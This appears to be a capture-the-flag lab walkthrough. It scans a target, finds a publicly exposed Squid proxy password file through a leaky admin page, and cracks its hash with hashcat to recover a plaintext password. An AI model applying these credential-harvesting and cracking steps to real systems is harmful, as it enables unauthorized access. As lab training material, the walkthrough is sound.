
---

IP = `10.10.91.26`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
/etc
/admin
```

`http://10.10.91.26/admin/admin.html`

```
### Admin Shoutbox

            `############################################                 ############################################                 [Yesterday at 4.32pm from Josh]                 Are we all going to watch the football game at the weekend??                 ############################################                 ############################################                 [Yesterday at 4.33pm from Adam]                 Yeah Yeah mate absolutely hope they win!                 ############################################                 ############################################                 [Yesterday at 4.35pm from Josh]                 See you there then mate!                 ############################################                 ############################################                 [Today at 5.45am from Alex]                 Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.                 I decided to give up like i always do ahahaha sorry about that.                 I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.                 Might pass it over to the IT guys but in the meantime all the config files are laying about.                 And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.                 other than that im pretty sure my backup "music_archive" is safe just to confirm.                 ############################################                 ############################################`
```



`http://10.10.91.26/etc/squid/passwd`

```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

`http://10.10.91.26/etc/squid/squid.conf`

```
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```


`hashcat -a 0 -m 1600 hash rockyou.txt`

```
$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward
```



